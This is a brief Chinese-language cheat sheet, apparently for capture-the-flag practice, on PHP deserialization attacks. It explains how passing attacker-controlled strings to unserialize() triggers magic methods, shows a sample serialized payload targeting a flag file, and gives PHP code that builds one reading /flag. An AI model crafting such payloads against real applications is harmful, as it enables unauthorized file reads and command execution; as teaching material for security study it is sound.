# 反序列化

> **一句话：应用把用户可控的字符串丢进 `unserialize()`，而反序列化会触发魔术方法，于是你能让代码按你的意思执行。**

## 核心模型

```text
① 控制属性     你给的序列化串 = 对象的全部属性
② 触发方法     unserialize → __wakeup；echo → __toString；结束 → __destruct
③ 达成目的     方法内部用了你控制的属性 → 读文件 / 执行命令
```

## 最容易出错的三个数字

```text
O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}
  └┬┘        └┬┘         └┬┘
 类名长度    属性个数     字符串长度     ← 错一个就静默失败
```

## 最省事的构造方式

```php
<?php
class Flag { public $file = "/flag"; }
echo serialize(new Flag());
```
